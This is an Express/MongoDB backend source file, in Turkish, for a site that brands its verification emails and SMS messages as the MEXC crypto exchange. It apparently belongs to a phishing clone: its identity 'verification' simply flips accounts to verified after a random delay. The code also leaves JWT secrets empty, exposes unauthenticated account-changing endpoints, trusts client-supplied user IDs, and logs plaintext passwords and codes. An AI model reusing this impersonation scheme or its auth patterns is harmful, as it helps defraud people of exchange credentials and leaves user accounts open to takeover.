import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import jwt from 'jsonwebtoken';
import { v4 as uuidv4 } from 'uuid';
import bcrypt from 'bcrypt';
import cookieParser from 'cookie-parser';
import twilio from 'twilio';
import nodemailer from 'nodemailer';
import crypto from 'crypto';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
//const logoPath = path.join(__dirname, '..', 'assets', 'logo.png'); 

const accountSid = ''; 
const authToken = ''; 
const client = twilio(accountSid, authToken);

const app = express();
const PORT = 3001;

app.use(cors());
app.use(cookieParser());
app.use(express.json());

const transporter = nodemailer.createTransport({
  host: '',
  port: 465,
  secure: true,
  auth: {
    user: '',
    pass: ''
  }
});

function generateVerificationCode() {
  return crypto.randomInt(100000, 999999).toString(); 
}

function sendVerificationEmail(email, code) {
  const mailOptions = {
    from: '',
    to: email,
    subject: '[MEXC] E-Posta Doğrulama',
    html: `
      <!DOCTYPE html>
      <html>
      <head>
      <meta charset="UTF-8">
      <title>E-Posta Doğrulaması</title>
      </head>
      <body style="font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4;">
        <div style="max-width: 600px; margin: 20px auto; background-color: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);">
          <div style="background-color: #007bff; color: #fff; padding: 10px; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
            <img src="cid:logo" alt="MEXC Logo" style="max-width: 100px; margin-bottom: 10px;">
            <h2 style="margin: 0;">E-Posta Doğrulama Kodu</h2>
          </div>
          <div style="padding: 20px;">
            <p>Değerli MEXC'li,</p>
            <p>Sisteme kayıt olma talebinde bulundunuz.</p>
            <p style="font-size: 24px; font-weight: bold; text-align: center; margin-bottom: 20px;">${code}</p> 
            <p>Doğrulama kodu 5 dakika boyunca geçerlidir. Lütfen bu kodu kimseyle paylaşmayın.</p>
            <p><strong>Hatırlatma:</strong> Şifre sıfırlandıktan sonra 24 saat boyunca çekim işlemleri askıya alınır.</p>
            <p><strong>Dikkat:</strong> Bu isteği siz göndermediyseniz, lütfen Canlı Destek ile iletişime geçin.</p>
          </div>
          <div style="background-color: #f0f0f0; padding: 10px; text-align: center; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; font-size: 12px;">
            <p>2018 yılında kurulan MEXC, yüksek performanslı eşleme motoru teknolojisini kullanan merkezi bir borsadır. Platform, finans sektöründe ve blok zincir teknolojisinde zengin deneyime sahip profesyonel bir ekip tarafından yönetilmektedir.</p>
            <div style="margin-top: 10px;">
              <a href="#" style="display: inline-block; margin: 0 5px;"><img alt="" height="26" width="26" src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/lam-fZmwmvn.png" data-imagetype="External"></a>
              <a href="#" style="display: inline-block; margin: 0 5px;"><img alt="" height="26" width="26" src="https://www.facebook.com/images/fb_icon_325x325.png" data-imagetype="External"></a>
            </div>
            <p>Bu e-posta, otomatik olarak oluşturuldu. Bu e-postaya yanıtlarınız ulaşmaz. Lütfen bu e-postayı yanıtlamayın.</p>
          </div>
        </div>
      </body>
      </html>
    `,
    attachments: [{
      filename: 'logo.png',
      path: path.resolve(__dirname, '..', 'assets', 'logo.png'),
      cid: 'logo'
    }]
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log('E-posta gönderim hatası:', error);
    } else {
      console.log('E-posta gönderildi: ' + info.response);
    }
  });
}

mongoose.connect('')
  .then(() => {
    console.log('Connected to MongoDB');

    app.listen(PORT, () => {
      console.log(`Server is running on port ${PORT}`);
    });

    const User = mongoose.model('User', {
      email: { type: String, unique: true, sparse: true },
      phone: { type: String, unique: true, sparse: true },
      password: { type: String, required: true },
      token: { type: String },
      uid: { type: String, unique: true },
      lastLogin: { type: Date },
      verified_advanced: { type: Boolean, default: false },
      verified_primary: { type: Boolean, default: false },
      phone_verification: { type: Boolean, default: false },
      email_verification: { type: Boolean, default: false }
    });
  
const jwtSecretKey = '';

function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    return res.status(401).json({ message: 'Token eksik' }); 
  }

  jwt.verify(token, '', (err, user) => {
    if (err) {
      if (err.name === 'TokenExpiredError') {
        return res.status(401).json({ message: 'Token süresi doldu' }); 
      } else if (err.name === 'JsonWebTokenError') {
        return res.status(403).json({ message: 'Geçersiz token' }); 
      } else {
        console.error('Token doğrulama hatası:', err);
        return res.status(500).json({ message: 'Sunucu hatası' }); 
      }
    }

    req.user = user; 
    next(); 
  });
}

    app.post('/api/check-email-or-phone', async (req, res) => {
      try {
        const { emailOrPhone, isMobile } = req.body;

        const query = isMobile ? { phone: emailOrPhone } : { email: emailOrPhone };
        const user = await User.findOne(query);

        res.json({ exists: !!user }); 
      } catch (error) {
        console.error('Error checking email/phone:', error);
        res.status(500).json({ message: 'Server error' });
      }
    });

    app.post('/api/login', async (req, res) => {
      try {
        const { emailOrPhone, password, isMobile } = req.body;
    
        if (!emailOrPhone || !password) {
          return res.status(400).json({ message: 'E-posta/telefon numarası ve şifre gereklidir.' });
        }
    
        const query = isMobile ? { phone: emailOrPhone } : { email: emailOrPhone };
        const user = await User.findOne(query);
    
        if (!user) {
          return res.status(401).json({ message: 'Geçersiz e-posta/telefon numarası veya şifre' });
        }
    
        const isPasswordValid = await bcrypt.compare(password, user.password);
        if (!isPasswordValid) {
          return res.status(401).json({ message: 'Geçersiz e-posta/telefon numarası veya şifre' });
        }
    
        const token = jwt.sign({ userId: user._id }, '', { expiresIn: '48h' });
        const updatedUser = await User.findByIdAndUpdate(user._id, { token, lastLogin: new Date() }, { new: true });
    
        if (!updatedUser) {
          return res.status(404).json({ message: 'User not found' }); 
        }
    
        res.json({ message: 'Login successful', token, user: updatedUser }); 
      } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Server error' });
      }
    });

    app.post('/api/register', async (req, res) => {
      try {
        const { email, phone, password } = req.body;
    
        if (!email && !phone) {
          return res.status(400).json({ message: 'Kayıt için email veya telefon gereklidir' });
        }
    
        if (!password) {
          return res.status(400).json({ message: 'Şifre zorunludur' });
        }
    
        const existingUser = await User.findOne({
          $or: [{ email }, { phone }]
        });
    
        if (existingUser) {
          if (existingUser.email === email) {
            return res.status(400).json({ message: 'Bu e-posta zaten kayıtlı' });
          }
    
          if (existingUser.phone === phone) {
            return res.status(400).json({ message: 'Bu telefon numarası zaten kayıtlı' });
          }
        }
    
        const uid = generateNumericUid();
    
        // bcrypt 
        const saltRounds = 10; 
        const hashedPassword = await bcrypt.hash(password, saltRounds);
    
        const newUser = new User({
          email,
          phone,
          password: hashedPassword,
          uid,
          lastLogin: null,
          verified_advanced: false,
          verified_primary: false,
          phone_verification: false,
          email_verification: false 
        });
    
        await newUser.save();
    
        if (email) {
          const emailVerificationToken = generateVerificationCode();
          newUser.emailVerificationToken = emailVerificationToken;
          await newUser.save();
          sendVerificationEmail(email, emailVerificationToken);
        }
    
        const token = jwt.sign({ userId: newUser._id }, '', { expiresIn: '48h' });
        await User.findByIdAndUpdate(newUser._id, { token });
    
        res.status(201).json({ 
          message: 'Kayıt başarılı. Lütfen e-posta adresinizi doğrulayın.', 
          token,
          emailVerificationRequired: !!email
        }); 
    
      } catch (error) {
        console.error('Registration error:', error);
    
        if (error.name === 'ValidationError') {
          return res.status(400).json({ message: error.message });
        } else if (error.code === 11000 && error.keyPattern.email) {
          return res.status(400).json({ message: 'Bu e-posta zaten kayıtlı' });
        } else if (error.code === 11000 && error.keyPattern.phone) {
          return res.status(400).json({ message: 'Bu telefon numarası zaten kayıtlı' });
        }
    
        res.status(500).json({ message: 'Server error' });
      }
    });
    
    app.post('/api/logout', authenticateToken, async (req, res) => {
      try {
        console.log('User data request received with token:', req.cookies.token);
    
        const userId = req.user.userId; 
        console.log('userId:', userId);
        if (!req.user || !req.user.userId) {
          console.log('Çıkış hatası: Kullanıcı doğrulanamadı');
          return res.status(401).json({ message: 'Yetkisiz erişim' });
        }
        
        try {
          const updatedUser = await User.findByIdAndUpdate(userId, { token: null });
    
          if (!updatedUser) {
            console.log('Çıkış hatası: Kullanıcı bulunamadı. userId:', userId);
            return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
          }
    
          console.log('Kullanıcı çıkış yaptı ve token temizlendi:', updatedUser);
        } catch (updateError) {
          console.log('Çıkış hatası: Kullanıcı güncelleme hatası. userId:', userId, 'Hata:', updateError);
          return res.status(500).json({ message: 'Kullanıcı güncelleme hatası' });
        }
    
        res.clearCookie('token');
    
        res.json({ message: 'Çıkış başarılı' });
      } catch (error) {
        console.log('Çıkış hatası:', error);
        res.status(500).json({ message: 'Sunucu hatası' });
      }
    });

    app.post('/api/user-data', authenticateToken, async (req, res) => {
      try {
        console.log('User data request received with token:', req.cookies.token);
    
        const userId = req.user.userId; 
        console.log('userId:', userId);
    
        const user = await User.findById(userId);
        console.log('user:', user);
    
        if (!user) {
          return res.status(404).json({ message: 'User not found' });
        }
    
        const userData = {
          email: user.email,
          phone: user.phone,
          uid: user.uid,
          lastLogin: user.lastLogin, 
          email_verification: user.email_verification,
          phone_verification: user.phone_verification
        };
    
        res.json({ 
          userData,
          verified_primary: user.verified_primary,
          verified_advanced: user.verified_advanced,
          email_verification: user.email_verification,
          phone_verification: user.phone_verification
        });
      } catch (error) {
        console.error('Error fetching user data:', error);
        if (error.name === 'CastError' && error.kind === 'ObjectId') {
          return res.status(400).json({ message: 'Invalid user ID' });
        }
        res.status(500).json({ message: 'Server error' });
      }
    });

    app.post('/api/start-verification', authenticateToken, async (req, res) => {
      try {
        if (!req.user || !req.user.userId) {
          return res.status(401).json({ message: 'Unauthorized' });
        }
    
        const userId = req.user.userId;
        const { verificationType } = req.body;
        
        if (!verificationType || (verificationType !== 'primary' && verificationType !== 'advanced')) {
          return res.status(400).json({ message: 'Invalid user ID' });
        }
    
        console.log('userId:', userId);
        console.log('verificationType:', verificationType);
    
        const user = await User.findById(userId);
        if (!user) {
          return res.status(404).json({ message: 'User not found' });
        }
    
        const delay = Math.floor(Math.random() * 30000) + 60000;
    
        setTimeout(async () => {
          try {
            if (verificationType === 'primary') {
              await User.findByIdAndUpdate(userId, { verified_primary: true });
              console.log('User verified (Type: Primary):', userId);
            } else if (verificationType === 'advanced') {
              await User.findByIdAndUpdate(userId, { verified_advanced: true });
              console.log('User verified (Type: Advanced):', userId);
            }
          } catch (error) {
            console.error('Verification error:', error);
          }
        }, delay);
    
        res.json({ message: `${verificationType} verification process started` });
      } catch (error) {
        console.error('Verification request error:', error);
        res.status(500).json({ message: 'Server error' });
      }
    });
    
    app.get('/api/check-verification', authenticateToken, async (req, res) => {
      try {
        const userId = req.query.userId;
        const verificationType = req.query.verificationType;
    
        if (!userId || !verificationType) {
          return res.status(400).json({ message: 'User ID or verification type is missing' });
        }
    
        const user = await User.findById(userId);
        if (!user) {
          return res.status(404).json({ message: 'User not found' });
        }
    
        if (verificationType === 'primary') {
          res.json({ verified_primary: user.verified_primary });
        } else if (verificationType === 'advanced') {
          res.json({ verified_advanced: user.verified_advanced });
        } else {
          return res.status(400).json({ message: 'Invalid verification type' });
        }
        
      } catch (error) {
        console.error('Verification status check error:', error);
        res.status(500).json({ message: 'Server error' });
      }
    });

    const verificationCodes = {};

    app.post('/api/send-verification-code', async (req, res) => {
      try {
        const phoneNumber = req.body.phoneNumber; 
    
        
        /*if (!phoneNumber || !isValidPhoneNumber(phoneNumber)) {
          console.error('Geçersiz telefon numarası:', phoneNumber);
          return res.status(400).json({ message: 'Geçersiz telefon numarası' });
        }*/

        const existingUser = await User.findOne({ phone: phoneNumber })

        if (existingUser) {
          console.log('Telefon numarası zaten kayıtlı:', phoneNumber);
          return res.json({ message: 'Bu telefon numarası zaten kayıtlı.', existingUser: true });
        } else {
          const verificationCode = Math.floor(100000 + Math.random() * 900000);
    
          try {
            await client.messages.create({
              body: `[MEXC] Doğrulama kodu: ${verificationCode}. Lütfen bu kodu paylaşmayın. B043`,
              from: '+15203326916',
              to: '+90' + phoneNumber
            });
      
            console.log(`Doğrulama kodu ${phoneNumber} numarasına gönderildi: ${verificationCode}`);
      
            verificationCodes[phoneNumber] = { code: verificationCode, timestamp: Date.now() };
      
            setTimeout(() => {
              delete verificationCodes[phoneNumber];
              console.log(`Doğrulama kodu ${phoneNumber} numarası için süresi doldu, silindi.`);
            }, 5 * 60 * 1000);
  
            res.json({ message: 'Doğrulama kodu gönderildi' });
          } catch (error) {
            console.error('SMS gönderme hatası:', error);
      
            if (error.code === 21610) {
              return res.status(429).json({ message: 'Çok fazla istek gönderildi. Lütfen daha sonra tekrar deneyin.' });
            }
      
            res.status(500).json({ message: 'Sunucu hatası' });
          }
        }
    
      } catch (error) {
        console.error('Doğrulama kodu gönderme isteği hatası:', error);
        res.status(500).json({ message: 'Sunucu hatası' });
      }
    });
    
    app.post('/api/verify-code', async (req, res) => {
      try {
        const phoneNumber = req.body.phoneNumber;
        const enteredCode = parseInt(req.body.code, 10); 
    
        console.log(`Doğrulama kodu kontrol ediliyor. Telefon numarası: ${phoneNumber}, Girilen kod: ${enteredCode}`);
    
        const storedData = verificationCodes[phoneNumber];
    
        if (!storedData) {
          console.error('Doğrulama kodu bulunamadı veya süresi doldu. Telefon numarası:', phoneNumber);
          return res.status(400).json({ message: 'Doğrulama kodu bulunamadı veya süresi doldu.' });
        }
    
        const { code: storedCode, timestamp } = storedData;
    
        if (Date.now() - timestamp > 5 * 60 * 1000) {
          delete verificationCodes[phoneNumber];
          console.error('Doğrulama kodu süresi doldu. Telefon numarası:', phoneNumber);
          return res.status(400).json({ message: 'Doğrulama kodu süresi doldu.' });
        }
    
        if (storedCode === enteredCode) {
          try {
            let user = await User.findOne({ phone: phoneNumber });
    
            if (user) {
              user.phone_verification = true;
              await user.save();
              console.log('Mevcut kullanıcı doğrulandı:', user);
    
              const token = jwt.sign({ userId: user._id }, '', { expiresIn: '48h' });
              await User.findByIdAndUpdate(user._id, { token });
    
              delete verificationCodes[phoneNumber];
              return res.json({ message: 'Doğrulama başarılı', token, existingUser: true }); 
            } else {
              delete verificationCodes[phoneNumber];
              return res.json({ message: 'Doğrulama başarılı', newUser: true }); 
            }
          } catch (error) {
            console.error('Kullanıcı güncelleme/oluşturma hatası:', error);
            res.status(500).json({ message: 'Sunucu hatası' });
          }
        } else {
          console.error('Geçersiz doğrulama kodu. Telefon numarası:', phoneNumber, 'Girilen kod:', enteredCode, 'Saklanan kod:', storedCode);
          res.status(400).json({ message: 'Geçersiz doğrulama kodu' });
        }
      } catch (error) {
        console.log('Doğrulama hatası:', error);
        res.status(500).json({ message: 'Sunucu hatası' });
      }
    });
    
    app.post('/api/register-with-phone', async (req, res) => {
      try {
        const { phone, password } = req.body;
    
        if (!phone || !password) {
          return res.status(400).json({ message: 'Telefon numarası ve şifre gereklidir.' });
        }
    
        function generateNumericUid(length = 8) {
          const uuid = uuidv4();
          const numericUid = uuid.replace(/-/g, '').substring(0, length); 
          const decimalUid = parseInt(numericUid, 16).toString();
          return decimalUid.substring(0, length);
        }
        const uid = generateNumericUid();
    
        const saltRounds = 10; 
        const hashedPassword = await bcrypt.hash(password, saltRounds);
    
        const newUser = new User({ 
          phone: phone, 
          password: hashedPassword,
          uid,
          verified_advanced: false,
          verified_primary: false,
          phone_verification: true
        });
    
        await newUser.save();
        await console.log(req.body);
        const token = jwt.sign({ userId: newUser._id }, '', { expiresIn: '48h' });
        await User.findByIdAndUpdate(newUser._id, { token });
    
        console.log('Yeni kullanıcı oluşturuldu ve doğrulandı:', newUser);
    
        res.json({ message: 'Kayıt ve doğrulama başarılı', token }); 
      } catch (error) {
        console.error('Kullanıcı kayıt hatası:', error);
        console.log(req.body);
        res.status(500).json({ message: 'Sunucu hatası' });
      }
    });    
    
    const emailVerificationCodes = {};

app.post('/api/send-email-verification', async (req, res) => {
  try {
    const email = req.body.email;
    const existingUser = await User.findOne({ email });

    if (existingUser) {
      console.log('E-posta zaten kayıtlı:', email);
      return res.json({ message: 'Bu e-posta zaten kayıtlı.', existingUser: true });
    } else {
      const verificationCode = generateVerificationCode();

      sendVerificationEmail(email, verificationCode);

      emailVerificationCodes[email] = { code: verificationCode, timestamp: Date.now() };

      setTimeout(() => {
        delete emailVerificationCodes[email];
      }, 5 * 60 * 1000);

      res.json({ message: 'Doğrulama e-postası gönderildi' });
      console.log('Doğrulama e-postası gönderildi:', verificationCode);
    }
  } catch (error) {
    console.error('E-posta gönderme hatası:', error);
    res.status(500).json({ message: 'Sunucu hatası' });
  }
});

app.post('/api/verify-email-code', async (req, res) => {
  try {
    const email = req.body.email;
    const enteredCode = req.body.code;

    const storedData = emailVerificationCodes[email];

    if (!storedData) {
      return res.status(400).json({ message: 'Doğrulama kodu bulunamadı veya süresi doldu.' });
    }

    const { code: storedCode, timestamp } = storedData;

    if (Date.now() - timestamp > 5 * 60 * 1000) {
      delete emailVerificationCodes[email];
      return res.status(400).json({ message: 'Doğrulama kodu süresi doldu.' });
    }

    if (storedCode === enteredCode) {
      delete emailVerificationCodes[email];
      return res.json({ message: 'Doğrulama başarılı', newUser: true }); 
    } else {
      res.status(400).json({ message: 'Geçersiz doğrulama kodu' });
    }
  } catch (error) {
    console.error('Doğrulama hatası:', error);
    res.status(500).json({ message: 'Sunucu hatası' });
  }
});

app.post('/api/register-with-email', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ message: 'E-posta ve şifre gereklidir.' });
    }

    function generateNumericUid(length = 8) {
      const uuid = uuidv4();
      const numericUid = uuid.replace(/-/g, '').substring(0, length); 
      const decimalUid = parseInt(numericUid, 16).toString();
      return decimalUid.substring(0, length);
    }
    const uid = generateNumericUid();

    const saltRounds = 10;
    const hashedPassword = await bcrypt.hash(password, saltRounds);

    const newUser = new User({
      email,
      password: hashedPassword,
      uid,
      verified_advanced: false,
      verified_primary: false,
      phone_verification: false,
      email_verification: true
    });

    await newUser.save();

    const token = jwt.sign({ userId: newUser._id }, '', { expiresIn: '48h' });
    await User.findByIdAndUpdate(newUser._id, { token });

    console.log('Yeni kullanıcı oluşturuldu ve doğrulandı:', newUser);

    res.json({ message: 'Kayıt ve doğrulama başarılı', token });
  } catch (error) {
    console.error('Kullanıcı kayıt hatası:', error);
    res.status(500).json({ message: 'Sunucu hatası' });
  }
});

app.post('/api/add-email', async (req, res) => {
  try {
    const { uid, email } = req.body;

    const user = await User.findOne({ uid });
    if (!user) {
      return res.status(404).json({ message: 'Kullanıcı bulunamadı.' });
    }

    const emailExists = await User.findOne({ email });
    if (emailExists) {
      return res.status(400).json({ message: 'Bu e-posta zaten kullanılıyor.' });
    }

    const emailVerificationCode = generateVerificationCode();
    emailVerificationCodes[email] = { code: emailVerificationCode, timestamp: Date.now() };

    sendVerificationEmail(email, emailVerificationCode);

    res.json({ message: 'E-posta ekleme başarılı, doğrulama kodu gönderildi.' });
  } catch (error) {
    console.error('E-posta ekleme hatası:', error);
    res.status(500).json({ message: 'Sunucu hatası' });
  }
});
app.post('/api/verify-added-email', async (req, res) => {
  try {
    const { uid, email, code } = req.body;

    const storedData = emailVerificationCodes[email];
    if (!storedData) {
      return res.status(400).json({ message: 'Doğrulama kodu bulunamadı veya süresi doldu.' });
    }

    const { code: storedCode, timestamp } = storedData;
    if (Date.now() - timestamp > 5 * 60 * 1000) {
      delete emailVerificationCodes[email];
      return res.status(400).json({ message: 'Doğrulama kodunun süresi doldu.' });
    }

    if (storedCode !== code) {
      return res.status(400).json({ message: 'Geçersiz doğrulama kodu.' });
    }

    const updatedUser = await User.findOneAndUpdate(
      { uid },
      { email: email, email_verification: true },
      { new: true }
    );

    if (!updatedUser) {
      return res.status(404).json({ message: 'Kullanıcı bulunamadı.' });
    }

    delete emailVerificationCodes[email];
    res.json({ message: 'E-posta doğrulandı ve kullanıcı güncellendi.' });
  } catch (error) {
    console.error('E-posta doğrulama hatası:', error);
    res.status(500).json({ message: 'Sunucu hatası' });
  }
});

app.post('/api/add-phone', async (req, res) => {
  try {
    const { uid, phone } = req.body;

    console.log(`Telefon ekleme isteği alındı. UID: ${uid}, Telefon: ${phone}`);

    const user = await User.findOne({ uid });
    if (!user) {
      console.error('Kullanıcı bulunamadı:', uid);
      return res.status(404).json({ message: 'Kullanıcı bulunamadı.' });
    }

    const phoneExists = await User.findOne({ phone });
    if (phoneExists) {
      console.error('Telefon zaten kullanılıyor:', phone);
      return res.status(400).json({ message: 'Bu telefon numarası zaten kullanılıyor.' });
    }

    const phoneVerificationCode = Math.floor(100000 + Math.random() * 900000);
    
    console.log(`Doğrulama kodu oluşturuldu: ${phoneVerificationCode}, Telefon: ${phone}`);

    try {
      await client.messages.create({
        body: `[MEXC] Doğrulama kodu: ${phoneVerificationCode}. Lütfen bu kodu paylaşmayın. B043`,
        from: '+15203326916',
        to: '+90' + phone
      });

      console.log(`Doğrulama kodu ${phone} numarasına gönderildi: ${phoneVerificationCode}`);

      verificationCodes[phone] = { code: phoneVerificationCode, timestamp: Date.now() };

      setTimeout(() => {
        delete verificationCodes[phone];
        console.log(`Doğrulama kodu ${phone} numarası için süresi doldu, silindi.`);
      }, 5 * 60 * 1000);

      res.json({ message: 'Telefon ekleme başarılı, doğrulama kodu gönderildi.' });
    } catch (error) {
      console.error('SMS gönderme hatası:', error);

      if (error.code === 21610) {
        return res.status(429).json({ message: 'Çok fazla istek gönderildi. Lütfen daha sonra tekrar deneyin.' });
      }

      res.status(500).json({ message: 'SMS gönderme hatası' });
    }
  } catch (error) {
    console.error('Telefon ekleme hatası:', error.message || error);
    res.status(500).json({ message: 'Sunucu hatası' });
  }
});

app.post('/api/verify-added-phone', async (req, res) => {
  try {
    const { phone, code } = req.body;

    const storedData = verificationCodes[phone];
    if (!storedData) {
      return res.status(400).json({ message: 'Doğrulama kodu bulunamadı veya süresi doldu.' });
    }

    const { code: storedCode, timestamp } = storedData;

    if (Date.now() - timestamp > 5 * 60 * 1000) {
      delete verificationCodes[phone];
      return res.status(400).json({ message: 'Doğrulama kodu süresi doldu.' });
    }

    if (parseInt(code, 10) !== storedCode) {
      return res.status(400).json({ message: 'Geçersiz doğrulama kodu.' });
    }

    const user = await User.findOneAndUpdate(
      { phone: null },
      { phone, phone_verification: true }, 
      { new: true }
    );

    if (!user) {
      return res.status(404).json({ message: 'Kullanıcı bulunamadı.' });
    }

    delete verificationCodes[phone];

    res.json({ message: 'Telefon başarıyla doğrulandı ve eklendi.', user });
  } catch (error) {
    console.error('Telefon doğrulama hatası:', error.message || error);
    res.status(500).json({ message: 'Sunucu hatası' });
  }
});


  })
  .catch(err => {
    console.error('Failed to connect to MongoDB', err);
  });